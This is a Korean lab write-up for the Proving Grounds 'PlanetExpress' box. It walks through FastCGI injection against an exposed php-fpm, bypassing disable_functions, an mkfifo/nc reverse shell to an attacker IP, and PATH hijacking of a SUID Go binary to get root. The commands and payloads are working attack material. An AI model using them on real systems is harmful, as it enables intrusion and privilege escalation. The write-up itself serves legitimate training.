---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/svc/php-fpm
  - tech/enum/dirbust
  - tech/lin/suid
  - tech/lin/path-hijack
  - tech/payload/revshell
  - tech/exec/ssh-key
type: machine
platform: pg
os: linux
ip: 192.168.248.205
ports: [22, 80, 9000]
services: [cslistener, http, ssh]
status: solved
manual_tags: true
manual_cves: true
tech_count: 6
---
> [!info] PG Practice — Fundamental
> **타겟** 192.168.248.205 · **OS** Debian 10 (`planetexpress`, 4.19.0-18) · **난이도** Fundamental · **플래그 2개**
> **경로 요약** 80 Pico CMS 의 `config.yml` 이 자작 플러그인 이름을 흘림 → `/plugins/PicoTest.php` = `phpinfo()` → DOCUMENT_ROOT 확보 → **tcp/9000 에 노출된 php-fpm 에 FastCGI 직타로 RCE** (`www-data`) → SUID Go 바이너리 `/usr/sbin/relayd` 가 `iptables` 를 **상대경로로** exec → **PATH 하이재킹** → root
>
> 플래그 값은 **2026-08-20 인스턴스** 것이다. PG 는 박스를 다시 켤 때마다 새로 만든다.

> [!warning] 적대적 검증 정정 이력 (2026-08-20)
> 초고를 `~/PG/PlanetExpress/` 산출물 62개와 대조해 고친 것들이다. 상세는 `03. PG/_AUDIT/PlanetExpress-audit.md`.
>
> | 위치 | 무엇이 틀렸나 | 어떻게 고쳤나 |
> |---|---|---|
> | 1장 phpinfo 판독 | phpinfo 가 보여준 `disable_functions`·`allow_url_include`·`open_basedir`·`extension_dir` 넷을 **박스 설정으로 읽었다.** 넷 다 우리 `fcgi.py` 가 주입한 값과 정확히 일치한다 | 자기 오염으로 정정하고 6장 (4)에 함정으로 분리 |
> | 1장 `Not shown: filtered` | "리버스셸이 안 붙을 것을 예고" — inbound filtered 는 INPUT 체인 얘기지 OUTPUT 얘기가 아니다 | 휴리스틱으로 강등 |
> | 3장 리버스셸 | "포트를 바꿔야 붙는다" — 443→80 과 동시에 `proc_open` 핸들·서브셸도 바꿨다 | 교란변수 명시 |
> | 4장 `nm ... grep " t main\."` | 소문자 `t` 로는 **한 줄도 안 나온다.** 실제 심볼은 `T`, 개수도 13이 아니라 14 | 명령·목록·개수 정정 |
> | 4장 `grep -E "os/exec\.[A-Za-z]+$"` | 그 정규식은 9줄을 뱉는다. 노트는 2줄만 실었다 | 명령을 출력에 맞게 정정 |
> | 6장 tcpdump | "필터를 고쳐 다시 잡으니 한 패킷도 안 잡혔다" — 유일한 tcpdump 산출물은 `can't parse filter expression: syntax error` 한 줄이다 | 실측대로 정정, 회상 부분은 `[가정]` |
> | 여러 곳 | try5/try6/try10/try12 블록에서 한 줄 압축·생략·`try/except` 삭제 | 로그 원문으로 복원 |
>
> **이 박스는 정지됐다.** 아래 「관측 없음」 표시가 붙은 항목은 재수집이 불가능하다.

## 0. 이 박스에서 배우는 것

- **설정 파일의 주석이 공격면을 알려준다.** gobuster 는 8줄만 뱉고 끝났다. 진짜 진입점 `/plugins/PicoTest.php` 는 워드리스트에 없는 이름이고, 읽히는 `config.yml` 의 **주석 처리된 블록**에 적혀 있었다.
- **tcp/9000 이 열려 있고 배너가 안 잡히면 php-fpm 을 의심한다.** FastCGI 는 HTTP 가 아니라서 `nc` 로 GET 을 던져도 0바이트가 돌아온다. nmap 은 `cslistener?` 로만 적는다.
- **`disable_functions` 는 전부 막지 못한다.** `system`·`exec`·`shell_exec` 이 죽어도 `passthru`·`popen`·`proc_open` 이 살아 있으면 끝이다. 셋 다 확인하기 전에 포기하지 마라.
- **SUID 바이너리가 상대경로로 외부 명령을 부르면 PATH 하이재킹이다.** 그리고 심어놓은 스크립트를 `#!/bin/sh` 로 쓰면 **dash 가 euid 를 버려서** 조용히 실패한다. 이게 이 박스에서 제일 많이 시간을 태운 함정이다.
- **정찰 페이지가 내 익스플로잇 값을 되비칠 수 있다.** 여기 phpinfo 가 보여준 `disable_functions`·`open_basedir`·`extension_dir` 은 박스 설정이 아니라 **내가 몇 분 전에 9000 으로 주입한 값**이었다. 익스플로잇을 쏘기 전에 정찰 페이지를 먼저 저장해 두라(6장 (4)).
- **시험 출제 가능성** — "관리 포트가 0.0.0.0 에 노출" 은 OSCP 에서 흔하다(9000 php-fpm, 6379 redis, 11211 memcached, 2375 docker). SUID 바이너리 PATH 하이재킹은 Linux 권한상승의 고전이고, 여기처럼 **커스텀 바이너리라 검색으로 안 나오는** 형태가 시험에 어울린다.

## 1. 정찰

### Nmap

방향부터 잡으려고 top-200 을 먼저 돌렸다.

```
nmap -Pn -T4 --top-ports 200 -oN quick.log 192.168.248.205

Nmap scan report for 192.168.248.205
Host is up (0.085s latency).
Not shown: 197 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9000/tcp open  cslistener
```

전수 스캔도 같은 그림이다.

```
nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.248.205

Nmap scan report for 192.168.248.205
Host is up (0.085s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
80/tcp   open  http        Apache httpd 2.4.38 ((Debian))
|_http-generator: Pico CMS
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: PlanetExpress - Coming Soon !
9000/tcp open  cslistener?
```

읽을 것이 셋이다.

**`Not shown: 65532 filtered`** — 닫힌(closed) 포트가 하나도 없다. RST 를 안 돌려준다는 건 방화벽이 DROP 한다는 뜻이다. 다만 이건 **INPUT 체인 얘기지 OUTPUT 얘기가 아니다.** 들어오는 게 막혀 있다고 나가는 것도 막혀 있다는 보장은 없다 — 상관이 높은 휴리스틱일 뿐이다. 이 박스는 실제로 OUTPUT 체인도 걸려 있었지만(4장), 그건 나중에 root 로 `iptables -S` 를 읽고서야 확인한 것이다.

**`http-generator: Pico CMS`** — nmap 의 `http-generator` 스크립트가 `<meta name="generator">` 를 긁은 것이다. 버전은 안 나온다.

**`9000/tcp open cslistener?`** — `cslistener` 는 IANA 등록명일 뿐 실제 서비스가 아니다. `?` 는 `-sV` 프로브가 응답을 하나도 못 받았다는 표시다. 직접 때려봐도 같다.

```
(printf 'GET / HTTP/1.0\r\n\r\n'; sleep 3) | timeout 8 nc 192.168.248.205 9000 | xxd | head -20
```

출력이 한 줄도 없었다. **HTTP 로 말을 걸었는데 아무것도 안 돌아오는 포트**는 바이너리 프로토콜이라는 뜻이고, 9000 + PHP 사이트 조합이면 php-fpm 이 1순위다.

### 웹 — Pico CMS

![[PG-PlanetExpress-pico-landing.png]]

"Coming Soon" 랜딩 한 장뿐이다. 폼(`name=email`)은 `action="/"` 라 아무 데도 안 간다.

디렉터리를 손으로 훑었다.

```
403 280  /content/
403 280  /config/
403 280  /vendor/
403 280  /plugins/
403 280  /themes/
404 277  /composer.json
200 5176 /index.php
200 0    /content/index.md
404 16   /config/config.php
```

`/config/config.php` 의 **404 본문 크기가 다르다**(16 vs 277). 열어보면 정체가 나온다.

```
curl -s -i -m 10 "http://192.168.248.205/config/config.php"

HTTP/1.1 404 Not Found
Date: Thu, 20 Aug 2026 07:06:43 GMT
Server: Apache/2.4.38 (Debian)
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8

File not found.
```

Apache 의 404 는 `Content-Length: 277` 짜리 HTML 문서다. 여기 것은 `Transfer-Encoding: chunked` + 본문 `File not found.`(16바이트) — **php-fpm 이 존재하지 않는 스크립트에 대해 내는 응답**이 Apache 를 그대로 통과해 나온 것이다.

엄밀히 말하면 이건 "이 사이트의 PHP 는 fpm 이 돌린다" 까지만 말해준다. **그 fpm 이 9000 이라는 건 아직 아니다** — 유닉스 소켓일 수도 있다. 확정은 3장에서 9000 에 FastCGI 레코드를 직접 보내 응답을 받은 시점이다. 다만 "PHP=fpm" + "9000 이 열려 있고 배너가 없다" 두 개가 겹치면 실무적으로는 그때 이미 확신하고 움직여도 된다.

`.php` 가 아닌 파일은 Apache 가 그냥 준다.

```
200 23215 /vendor/composer/installed.json
200 812   /config/config.yml
200 4898  /themes/launch/index.twig
```

### 버전 판정

`installed.json` 에서 컴포넌트 버전이 전부 나온다.

```
erusev/parsedown 1.8.0-beta-7
erusev/parsedown-extra 0.8.0-beta-1
picocms/composer-installer v1.0.1
picocms/pico v2.1.4
picocms/pico-deprecated v2.1.4
picocms/pico-theme v2.1.4
symfony/polyfill-ctype v1.23.0
symfony/yaml v2.8.52
twig/twig v1.44.6
```

**Pico CMS 2.1.4.** 이 박스에서 **Pico 자체의 취약점은 쓰지 않았다.** Pico 가 한 일은 `config.yml` 을 웹에서 읽히게 둔 것뿐이다. 버전이 나왔다고 CVE 부터 뒤지지 말고, 그 파일이 **뭘 흘리는지**를 먼저 읽어라 — 여기선 그게 답이었다.

### 결정적인 한 줄 — `config.yml`

```
curl -s -m 10 "http://192.168.248.205/config/config.yml"
```

전문 중 끝부분:

```yaml
##
# Plugins: https://github.com/picocms/Pico/tree/master/plugins
#
plugins_url: ~
DummyPlugin.enabled: false

PicoOutput:
  formats: [content, raw, json]

##
# Self developed plugin for PlanetExpress
#
#PicoTest:
#  enabled: true
```

`debug: true` 도 위쪽에 있다. 하지만 값나가는 건 맨 아래 **주석 처리된 `PicoTest`** 다. "Self developed plugin" 이라고 친절히 적어놨다.

Pico 의 플러그인은 `plugins/<이름>.php` 에 놓인다. 그래서 `/plugins/PicoTest.php` 를 때렸다.

```
200 66763 /plugins/PicoTest.php
```

66KB. 플러그인 소스가 그대로 나온 게 아니라 — **실행된 결과**다.

![[PG-PlanetExpress-picotest-phpinfo.png]]

`phpinfo()` 였다. 플러그인은 `config.yml` 에서 비활성이지만, **파일 자체는 웹루트 아래에 있고 Apache 가 `.php` 를 fpm 에 넘긴다.** Pico 가 로드하든 말든 직접 요청하면 실행된다.

> [!tip] 프레임워크의 "플러그인 비활성화" 는 파일 접근 제어가 아니다
> 활성/비활성은 프레임워크가 그 파일을 `include` 하느냐의 문제일 뿐이다. 웹루트 안에 있으면 웹서버는 프레임워크와 무관하게 실행한다. 같은 이유로 `themes/`·`plugins/`·`vendor/` 아래의 `.php` 는 전부 직접 요청 대상이다.

phpinfo 에서 뽑은 것(`picotest_out.html`, 66763바이트):

```
PHP Version                7.3.31-1~deb10u1
System                     Linux planetexpress 4.19.0-18-amd64 ... x86_64
Server API                 FPM/FastCGI
Loaded Configuration File  /etc/php/7.3/fpm/php.ini
allow_url_fopen            On | On
allow_url_include          On | On
disable_functions          no value | no value
open_basedir               / | /
extension_dir              /tmp | /tmp
$_SERVER['SERVER_SOFTWARE']       Apache/2.4.38 (Debian)
$_SERVER['SCRIPT_FILENAME']       /var/www/html/planetexpress/plugins/PicoTest.php
$_SERVER['DOCUMENT_ROOT']         /var/www/html/planetexpress
```

`DOCUMENT_ROOT = /var/www/html/planetexpress`. 이 한 줄이 3장을 열었다.

**단 이 표에서 설정값 줄은 믿으면 안 된다.** `allow_url_include` · `open_basedir` · `extension_dir` · `disable_functions` 네 줄은 박스 설정이 아니라 **내가 몇 분 전에 9000 으로 쏜 FastCGI 요청이 남긴 내 값**이다 — `fcgi.py` 의 `PHP_VALUE`/`PHP_ADMIN_VALUE` 와 글자까지 같다. 결정적으로 `disable_functions` 는 Master Value 까지 `no value` 인데 root 로 읽은 `php.ini:310` 에는 블랙리스트가 그대로 있고, `extension_dir = /tmp` 는 어떤 배포판 기본값도 아니다(이 빌드의 확장 디렉터리는 API 번호 `20180731` 계열이다). 자세한 판별은 6장 (4).

여기서 실제로 값을 얻은 것은 `DOCUMENT_ROOT`·`SCRIPT_FILENAME`·`System`·`PHP Version`·`Loaded Configuration File` — 전부 Apache/엔진이 채우는 줄이라 오염 대상이 아니다.

## 2. 취약점 분석 — 노출된 php-fpm

### 배경

php-fpm 은 웹서버와 **FastCGI** 로 통신한다. 웹서버가 `SCRIPT_FILENAME` 같은 환경변수를 FastCGI 레코드로 싸서 보내면 fpm 이 그 파일을 실행하고 결과를 돌려준다. 인증은 없다 — 신뢰 경계가 "웹서버만 접속할 수 있다" 라는 가정 위에 서 있다.

그래서 fpm 이 **유닉스 소켓이 아니라 `0.0.0.0:9000`** 에 붙어 있고 방화벽이 그 포트를 열어두면, 아무나 웹서버 행세를 하며 임의 PHP 를 실행시킬 수 있다.

이 박스의 실제 설정(root 획득 후 확인):

```
/etc/php/7.3/fpm/pool.d/www.conf:6:listen = 0.0.0.0:9000
/etc/php/7.3/fpm/pool.d/www.conf:8:listen.owner = www-data
/etc/php/7.3/fpm/pool.d/www.conf:9:listen.group = www-data
```

Debian 의 `php7.3-fpm` 패키지는 `listen = /run/php/php7.3-fpm.sock` 으로 출하한다. `0.0.0.0:9000` 은 누가 일부러 바꿔 놓은 것이고, `127.0.0.1` 도 아닌 전 인터페이스다.

### 왜 이 페이로드인가

FastCGI 파라미터 중 `PHP_VALUE` / `PHP_ADMIN_VALUE` 는 fpm 이 **php.ini 지시자**로 해석한다. 이름만 보면 요청 단위 같지만 이 박스에서는 **다음 요청까지 남았다** — 6장 (4) 를 보라. 세 개를 조합한다.

| 지시자 | 역할 | 빼면 |
|---|---|---|
| `auto_prepend_file = php://input` | 대상 스크립트보다 **먼저** 요청 본문을 PHP 로 실행 | 실행할 코드를 주입할 곳이 없다 |
| `allow_url_include = On` | `php://` 래퍼를 `include` 계열에서 허용 | `auto_prepend_file` 이 URL 래퍼를 거부한다 |
| `open_basedir = /` | 경로 제한 해제 | 제한이 걸려 있으면 대상 스크립트에 못 닿는다 |

셋 다 실제로 필요했다. phpinfo 가 `allow_url_include=On`·`open_basedir=/` 를 보여주길래 "이 둘은 보험" 이라고 적었다가 지웠다 — 1장에서 밝힌 대로 그 두 값 자체가 **내가 보낸 `PHP_VALUE` 가 되비친 것**이라 박스 기본 설정의 근거가 못 된다. 원 설정을 모를 때는 셋을 다 얹는 게 맞다.

**제약이 하나 있다.** php-fpm 은 `SCRIPT_FILENAME` 이 가리키는 파일이 **실제로 존재해야** 요청을 처리한다. 없으면 `Primary script unknown` 만 뱉고 끝이라 `auto_prepend_file` 도 안 돈다. 그래서 docroot 를 아는 것이 선행 조건이었다.

## 3. Foothold — FastCGI 직타

### 클라이언트

공개 도구(`fcgi_exp`, `Gopherus`) 대신 최소 FastCGI 클라이언트를 직접 썼다. 레코드 포맷이 단순해서 여기 쓴 것도 87줄이다 — `FCGI_BEGIN_REQUEST` → `FCGI_PARAMS`(name-value 인코딩) → 빈 `FCGI_PARAMS` → `FCGI_STDIN`(본문) → 빈 `FCGI_STDIN`.

산출물: `~/PG/PlanetExpress/fcgi.py`

핵심 파라미터만 옮기면 이렇다.

```python
'SCRIPT_FILENAME': script,
'REQUEST_METHOD' : 'POST',
'CONTENT_LENGTH' : str(len(payload)),
'PHP_VALUE'      : 'allow_url_include = On\nopen_basedir = /\nauto_prepend_file = php://input',
'PHP_ADMIN_VALUE': 'extension_dir = /tmp\ndisable_functions = ',
```

`PHP_VALUE` 안의 지시자 구분자는 **개행**이다. `[가정]` 세미콜론·콤마로 이으면 통째로 한 지시자의 값으로 뭉쳐 의도대로 안 먹는다 — 이 박스에서 분리 실험은 안 했고, 처음부터 개행으로 썼다.

### 첫 시도 — docroot 를 모를 때

```
python3 fcgi.py 192.168.248.205 9000 /var/www/html/index.php "echo 'PWN'; system('id');"

--- STDOUT ---
Status: 404 Not Found
Content-type: text/html; charset=UTF-8

File not found.

--- STDERR ---
Primary script unknown
```

**FastCGI 로 말이 통한다는 것 자체는 이미 성공**이다(9000=php-fpm 두 번째 근거). 다만 경로가 틀렸다. 후보 12개를 돌려도 전부 같은 응답이었다(`try1_fcgi_index.log`). 여기서 막혀 있다가 phpinfo 를 읽고 풀렸다.

### 경로를 알고 나서

`index.php` 를 대상으로 하면 Pico 의 HTML 이 쏟아져서 페이로드 출력이 파묻힌다(`try2_fcgi_realpath.log`, 5.7KB). **출력이 없는 파일**을 골라야 결과가 보인다.

```
python3 fcgi.py 192.168.248.205 9000 /var/www/html/planetexpress/vendor/autoload.php "echo \"XPWNX\"; system(\"id\");"

--- STDOUT ---
Content-type: text/html; charset=UTF-8

XPWNX
--- STDERR ---
PHP message: PHP Warning:  system() has been disabled for security reasons in php://input on line 1
```

`XPWNX` 가 찍혔다 = **임의 PHP 실행 확보.** 다만 `system()` 이 막혀 있다.

### disable_functions 우회

`PHP_ADMIN_VALUE` 로 `disable_functions` 를 빈 값으로 덮었는데도 `system()` 은 죽어 있었다. 확인해 보면 ini 값 자체는 비어 있다.

```
python3 fcgi.py ... "echo ini_get(\"disable_functions\").\"|\".php_uname().\"|\".get_current_user();"

--- STDOUT ---
Content-type: text/html; charset=UTF-8

|Linux planetexpress 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64|www-data
```

`disable_functions` 는 **엔진이 뜰 때 함수 테이블에서 해당 함수를 제거**한다. 요청 시점에 ini 문자열을 비워도 이미 사라진 함수는 안 돌아온다. `ini_get` 이 빈 값을 보고하는 것과 함수가 살아 있는 것은 별개다.

그래서 **뭐가 남았는지 세어봐야 한다.** 후보를 배열에 늘어놓고 `function_exists` 로 훑는다(`payload_funcs.php`).

```php
foreach(["system","exec","shell_exec","passthru","popen","proc_open","pcntl_exec","file_get_contents","file_put_contents","scandir","putenv","mail","imap_open","dl","curl_exec"] as $f)
    echo $f."=".(function_exists($f)?"Y":"N")." ";
```

```
--- STDOUT ---
Content-type: text/html; charset=UTF-8

system=N exec=N shell_exec=N passthru=Y popen=Y proc_open=Y pcntl_exec=N file_get_contents=Y file_put_contents=Y scandir=Y putenv=Y mail=Y imap_open=N dl=N curl_exec=N 
```

`passthru`·`popen`·`proc_open` 이 살아 있다. 나중에 root 로 읽은 `php.ini` 가 이유를 그대로 보여준다(`root_enum_fw.log`).

```
/etc/php/7.3/fpm/php.ini:310:disable_functions = system,exec,shell_exec,pcntl_alarm,pcntl_fork,pcntl_waitpid,
pcntl_wait,pcntl_wifexited,...,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,
```

블랙리스트가 `system`·`exec`·`shell_exec` 셋과 `pcntl_*` 전부만 나열하고 나머지는 잊었다. 명령 실행 경로가 셋뿐인 줄 알고 만든 목록이다.

> [!tip] `disable_functions` 를 만나면 세 갈래를 다 확인한다
> ① 명령 실행 계열 — `system` `exec` `shell_exec` `passthru` `popen` `proc_open` `pcntl_exec` `popen` `mail`(sendmail `-X` 트릭)
> ② 파일 계열 — `file_put_contents` 만 살아 있어도 크론/`authorized_keys`/`.so` 를 심을 수 있다
> ③ `putenv` + `mail`/`error_log` 로 `LD_PRELOAD` 를 거는 우회
> 이 박스는 ①에서 바로 끝났다.

### 열거

```php
passthru("id; hostname; hostname -I; uname -a; ls -la /home /var/www/html/planetexpress; cat /etc/passwd | grep -v nologin; which nc ncat socat python python3 perl bash wget curl 2>/dev/null");
```

`try6_enum.log` 에서 (디렉터리 리스팅 본문은 줄임):

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
planetexpress
192.168.248.205 
Linux planetexpress 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64 GNU/Linux
/home:
drwxr-xr-x  2 astro astro 4096 Jan 10  2022 astro
[… /var/www/html/planetexpress 리스팅 생략 …]
root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
astro:x:1000:1000::/home/astro:/bin/sh
/usr/bin/nc
/usr/bin/python
/usr/bin/python3
/usr/bin/perl
/usr/bin/bash
/usr/bin/wget
```

`which` 목록에서 `ncat`·`socat`·`curl` 이 빠진 것도 정보다 — 리버스셸 후보가 `nc`·`bash`·`python3`·`perl`·`wget` 으로 좁혀진다.

`/home/astro/local.txt` 는 `-rw-r--r--` 라 www-data 도 읽을 수 있었다. 하지만 **웹 경유로 읽은 플래그는 OSCP 에서 0점**이라 그냥 넘어갔다. 5장은 전부 SSH 대화형 세션에서 다시 뽑은 것이다.

### 리버스셸 — 443 으로는 못 나간다

443 은 안 붙었다(`payload_rev.php` → `try7_revshell.log` 는 `spawned` 만 찍고 `shell443.log` 는 `listening on [any] 443 ...` 에서 멈춰 있다). 4장 끝에서 밝히듯 타겟의 OUTPUT 체인이 **dport 53/80/9000 만** 허용한다.

붙은 쪽(`payload_rev80.php`):

```php
$c = 'rm -f /tmp/.pf; mkfifo /tmp/.pf; (/bin/sh -i < /tmp/.pf 2>&1 | nc 192.168.45.207 80 > /tmp/.pf) &';
proc_open('/bin/bash -c '.escapeshellarg($c),
          [0=>['pipe','r'],1=>['file','/dev/null','w'],2=>['file','/dev/null','w']], $p);
```

> [!warning] 여기서 변수를 한꺼번에 바꿨다 — 원인 하나를 특정하지 못한다
> 443 판(`payload_rev.php`)과 위 80 판은 **포트만 다른 게 아니다.**
> ① 포트 443 → 80 ② `proc_open` 의 stdout/stderr 가 `['pipe','w']` → `['file','/dev/null','w']` ③ 셸 명령이 `... &` → `( ... ) &` 서브셸.
> 포트가 **필요조건**인 건 확실하다 — root 로 읽은 `iptables -S` 가 443 을 OUTPUT `DROP` 으로 확정한다(4장). 하지만 나머지 둘이 각각 필요했는지는 **분리 실험을 안 했다.** `[가정]` 파이프로 두면 FastCGI 요청 종료 시 파이프가 닫혀 자식이 SIGPIPE 로 죽는다는 것이 `/dev/null` 로 바꾼 이유였는데, 이 박스에서 그 자체를 실측하지는 않았다.
>
> 교훈은 이 박스 밖으로도 간다 — **한 번에 한 변수만 바꿔라.** 안 그러면 붙어도 왜 붙었는지 모르고, 다음 박스에서 못 쓴다.

Kali 쪽:

```
listening on [any] 80 ...
connect to [192.168.45.207] from (UNKNOWN) [192.168.248.205] 57792
/bin/sh: 0: can't access tty; job control turned off
$ uid=33(www-data) gid=33(www-data) groups=33(www-data)
planetexpress
$
```

## 4. 권한상승 — SUID Go 바이너리의 PATH 하이재킹

### 열거

셸을 잡자마자 치는 다섯 개 중 넷을 돌렸다(`payload_enum2.php` → `enum_www-data.log`). SUID 목록에 낯선 게 하나 있다.

```
sudo: a password is required          ← sudo -n -l
--- suid ---
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/sbin/relayd
/usr/bin/mount
/usr/bin/passwd
/usr/bin/su
/usr/bin/fusermount
/usr/bin/umount
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/gpasswd
```

나머지 13개는 Debian 기본이다. **`/usr/sbin/relayd` 만 목록에 없어야 할 것**이다.

크론은 비어 있었다(`/etc/crontab` 은 Debian 기본 run-parts 4줄, `/etc/cron.d/` 는 `.placeholder` 와 `php` 뿐).

⚠️ **다섯 번째인 `getcap -r / 2>/dev/null` 은 안 쳤다.** SUID 에서 바로 답이 나와 그냥 넘어갔는데, 산출물 어디에도 `getcap` 이 없다 — **"capabilities 도 없었다" 고 쓸 근거가 없다.** 이 박스는 결과적으로 문제없었지만, 습관으로는 나쁜 생략이다. 다섯 개는 SUID 가 나와도 다 친다.

```
ls -la /usr/sbin/relayd
-rws---r-x 1 root root 3644754 Jan 10  2022 /usr/sbin/relayd

file: setuid ELF 64-bit LSB executable, x86-64, statically linked, Go BuildID=..., not stripped
dpkg-query: no path found matching pattern /usr/sbin/relayd
```

**모드 4705** 를 읽어라. owner `rws`, group `---`, other `r-x`. 그룹은 아무것도 못 하는데 **other 는 읽기·실행이 된다.** www-data 는 other 라서 실행할 수 있고, 게다가 **읽을 수 있어서 분석용으로 복사도 된다.**

`dpkg -S` 가 못 찾는다 = 패키지가 아니라 누가 얹은 파일이다.

```
/usr/sbin/relayd -h

Usage: relayd [options] [actions]
Actions:
  default action      start daemon
  -h                  show this help message
  -v                  show version info
  -k                  kill running daemon
  -s                  get running status
  -U                  hup (reload configs)
  -a [service]        add service for relay
  -r [service]        remove service for relay
  -i                  get real client ip
  -b [up|down]        broadcast the DS boot state
  -R                  reopen the log file
Options:
  -C [file]           read config from file
  -d                  enable debug mode. will not run in background
  -P [file]           set pid file for daemon
  -g [ip]             remote source ip
  -n [port]           remote source port
```

`relayd version: 1.0-4242, Dec 18 2021 13:37`. "DS boot state" 는 Synology DiskStation 냄새인데, 실제로는 **PG 가 만든 가짜**다(6장).

### 바이너리를 Kali 로 빼기

아웃바운드가 막혀 있으니 **인바운드 80 을 역이용**한다. 웹루트에 복사하고 `curl` 로 받는다.

```
cp /usr/sbin/relayd /var/www/html/planetexpress/assets/relayd.bin
63f7be5bc3bddda4783e84f7db1fedd0  /var/www/html/planetexpress/assets/relayd.bin

curl -s http://192.168.248.205/assets/relayd.bin -o relayd.bin
63f7be5bc3bddda4783e84f7db1fedd0  relayd.bin
```

md5 가 같으니 온전히 왔다. (이 파일은 정리 때 지웠다 — 「남긴 흔적」 참조.)

### 어디서 무엇을 실행하는가

Go 바이너리라 `not stripped` 면 심볼이 다 보인다.

```
nm relayd.bin | grep " T main\."
0000000000518b60 T main.addAndRemoveService
00000000005180c0 T main.broadcast
00000000005181e0 T main.getClientIP
00000000005183e0 T main.getStatus
0000000000517c80 T main.getVersion
0000000000518060 T main.killDaemon
0000000000518ca0 T main.main
0000000000517820 T main.parseOptions
0000000000518da0 T main.parseOptions.func1
0000000000517f00 T main.printDefaultMsg
0000000000517d20 T main.printMsg
0000000000518a00 T main.readConfig
0000000000518780 T main.runMain
0000000000517f80 T main.setPID
```

심볼 14개짜리 작은 프로그램이다. Go 정적 링크라 `T` 대문자(전역 텍스트 심볼)로 잡힌다 — 소문자 `t` 로 grep 하면 한 줄도 안 나온다. 다음은 외부 명령을 부르는지.

```
nm relayd.bin | grep -E " T os/exec\.(Command|LookPath)$"
00000000004d4180 T os/exec.Command
00000000004d6ba0 T os/exec.LookPath
```

`main` 영역만 디스어셈해서 호출 지점을 찾으면 두 곳이다.

```
objdump -d --start-address=0x517800 --stop-address=0x519000 relayd.bin > relayd.main.asm

566:  51812b:  call   4d4180 <os/exec.Command>     ← main.broadcast 안
1023: 518883:  call   4d4180 <os/exec.Command>     ← main.runMain 안
```

Go 는 문자열을 (포인터, 길이) 쌍으로 넘긴다. 두 호출 직전의 `lea`/`mov` 가 실을 인자다 — `broadcast` 는 `# 559578` 에 길이 8, 인자 슬라이스는 `# 5583db`. `runMain` 도 실행 파일 이름은 같은 `559578`, 인자만 `5583d9`. 그 주소를 파일 오프셋으로 환산해 읽으면:

```
0x559578 8 b'iptables'
0x5583db 2 b'-S'      ← broadcast
0x5583d9 2 b'-L'      ← runMain
```

**`exec.Command("iptables", "-S")`** — 절대경로가 아니다. Go 의 `exec.Command` 는 이름에 `/` 가 없으면 `LookPath` 로 **`$PATH` 를 뒤진다.** SUID 바이너리가 환경변수 PATH 를 그대로 물려받으니, 우리가 쓰는 디렉터리를 PATH 앞에 놓으면 root 권한으로 우리 파일이 실행된다.

`-b up` 이 `main.broadcast` 를 부른다.

### 첫 시도가 실패한 이유 — dash 가 권한을 버린다

```sh
mkdir -p /tmp/.x
printf '#!/bin/sh\ncp /bin/bash /tmp/.x/rootbash\nchmod 4755 /tmp/.x/rootbash\nid > /tmp/.x/whoami.txt\n' > /tmp/.x/iptables
chmod 755 /tmp/.x/iptables
PATH=/tmp/.x:$PATH timeout 30 /usr/sbin/relayd -b up 2>&1 | head -20
```

스크립트는 **분명히 실행됐다.**

```
-rwsr-xr-x  1 www-data www-data 1168776 Aug 20 03:14 rootbash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

그런데 `rootbash` 의 소유자가 `www-data` 다. `chmod 4755` 는 먹었지만 **root 소유가 아니라 아무 의미가 없다.** `id` 에도 `euid=0` 이 없다.

relayd 자체는 root 였다.

```
grep -E "^(Uid|Gid|CapEff)" /proc/self/status      ← 하이재킹된 스크립트 안에서
Uid:	33	33	33	33
Gid:	33	33	33	33
CapEff:	0000000000000000

ps -o pid,ppid,ruser,euser,cmd -p $PPID
  PID  PPID RUSER    EUSER    CMD
 1338  1337 www-data root     /usr/sbin/relayd -b up
```

부모(`relayd`)는 `EUSER=root` 인데 자식은 `Uid: 33 33 33 33` — real·effective·saved 가 전부 33 이다. **누가 euid 를 버렸다.**

범인은 `#!/bin/sh` = Debian 의 dash 다. dash 는 시작할 때 `uid != euid` 면 스스로 euid 를 uid 로 내린다. bash 도 `-p` 없이는 같다.

Kali 에서 재현해 확인했다(이 박스가 아니라 Kali 로컬 실측이다). setuid 래퍼 `w` 를 만들어 각 인터프리터를 띄웠다.

```
== dash script ==      ./w ~/dashtest/s.sh
uid=1000(kali) gid=1000(kali) groups=...              ← euid 없음
== python script ==    ./w ~/dashtest/p.py
1000 0                                                ← (uid, euid)
== bash -c id ==       ./w /bin/bash -c id
uid=1000(kali) gid=1000(kali) groups=...              ← euid 없음
== bash -p -c id ==    ./w /bin/bash -p -c id
uid=1000(kali) gid=1000(kali) euid=0(root) groups=... ← 유지
```

`#!/bin/bash -p` 와 `#!/bin/sh -p` 셔뱅도 같은 방식으로 euid 를 유지한다(둘 다 확인).

이 실험은 검증 때 **처음부터 다시 돌려 전부 재현했다** — dash/bash 스크립트·`bash -c id` 는 `euid` 가 없고, python 은 `1000 0`, `bash -p -c id`·`#!/bin/sh -p`·`#!/bin/bash -p` 는 `euid=0(root)` 유지. `dash 0.5.12-12`, `/bin/sh → /usr/bin/dash`.

> [!warning] 래퍼를 `/tmp` 에 만들면 실험 자체가 거짓말을 한다
